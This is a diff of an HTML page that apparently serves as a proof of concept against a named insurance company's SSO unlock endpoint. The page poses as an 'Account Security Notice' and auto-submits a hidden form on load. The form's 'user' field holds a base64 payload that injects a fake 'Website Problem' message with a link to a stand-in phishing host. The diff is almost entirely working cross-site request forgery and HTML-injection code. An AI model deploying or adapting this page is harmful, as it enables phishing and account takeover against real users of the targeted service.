@@ -1,12 +1,22 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-  <head>
-    <meta charset="utf-8">
-    <title>Safe POC Loader</title>
-  </head>
-  <body>
-    <h3>Safe POC Loader</h3>
-    <p>If User has Active session in browser redirect to Malicious Domain</p>
-    <script src="exp.js"></script>
-  </body>
+<head>
+    <title>Account Security Notice</title>
+</head>
+<body>
+    <h1>Please wait, verifying your account...</h1>
+    
+    <!-- Hidden form that submits to the real SSO page -->
+    <form id="attackForm" method="POST" action="https://sso.maxlifeinsurance.com/ComplianceFlag/sso/passOptionExtUnlock.jsp">
+        <input type="hidden" name="op" value="change">
+        <input type="hidden" name="user" value="PC9iPjwvZm9udD48L3RkPjwvdHI+PC90YWJsZT48YnI+PGJyPgo8Y2VudGVyPgo8aDI+IFdlYnNpdGUgUHJvYmxlbTwvaDI+CjxwPjxiPlRoZXJlIGlzIGEgcHJvYmxlbSB3aXRoIHRoZSB3ZWJzaXRlIHRvIHVubG9jayB0aGUgYWNjb3VudC48L2I+PC9wPgo8cD48YSBocmVmPSJodHRwczovL2V2aWwtcGhpc2hpbmctc2l0ZS5jb20vdW5sb2NrIj5DTElDSyBIRVJFIFRPIFVOTE9DSyBBQ0NPVU5UIDwvYT48L3A+CjxwPkNsaWNrIHRoZSBsaW5rIGFib3ZlIHRvIGNvbnRpbnVlLjwvcD4KPC9jZW50ZXI+Cjx0YWJsZT48dHI+PHRkPg==">
+    </form>
+
+    <script>
+        // Auto-submit when page loads
+        window.onload = function() {
+            document.getElementById("attackForm").submit();
+        }
+    </script>
+</body>
 </html>
